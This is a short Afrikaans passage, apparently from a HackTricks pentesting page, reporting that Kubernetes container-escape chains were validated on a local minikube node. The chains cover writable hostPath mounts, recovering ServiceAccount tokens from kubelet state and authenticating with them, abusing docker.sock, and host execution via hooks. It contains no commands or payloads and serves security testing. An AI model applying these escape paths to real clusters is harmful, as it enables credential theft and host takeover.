Die praktiese kettings op hierdie bladsy is teen ’n plaaslike Linux-minikube-node nagegaan. Die validering het die volgende gereproduseer:

- lees- en skryftoegang deur ’n tydelike skryfbare hostPath
- ontdekking van geprojekteerde ServiceAccount-tokens en gemonteerde Secrets deur `/var/lib/kubelet/pods`
- suksesvolle Kubernetes API-verifikasie met ’n aktiewe token wat uit daardie gemonteerde kubelet-toestand herwin is
- leesalleen-ontdekking van ’n aangrensende Docker `overlay2`-lêerstelsel deur gemonteerde `/var`
- Docker API-skepping van ’n susterhouer met ’n leesalleen-gasheerbinding deur ’n gemonteerde `docker.sock`
- vertraagde gasheeruitvoering deur ’n tydelike hook wat deur die gasheer gebruik word
- ’n CNI-wrapper-simulasie wat die oorspronklike inprop se argumente, standaardinvoer en uitvoering behou het

Dieselfde node het `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` en `config.gz` blootgestel, maar nie `uevent_helper`, EFI-veranderlikes, termiese inskrywings of `sched_debug` nie. Destruktiewe kernsnellers is nie uitgevoer nie. Dit bevestig dat kettings met gasheer-root, `/var`, kubelet-toestand, sockets en gasheerverbruikers herhaalbaar is, terwyl procfs/sysfs-helpertegnieke afhanklik moet bly van die presiese kern, monteringsmodus, loonvragpad en sneller.

## References

- [1] [Plaaslike lêers en paaie wat deur die Kubelet gebruik word](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent-houer kan toegang tot die gasheer kry via `hostPath`-montering](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
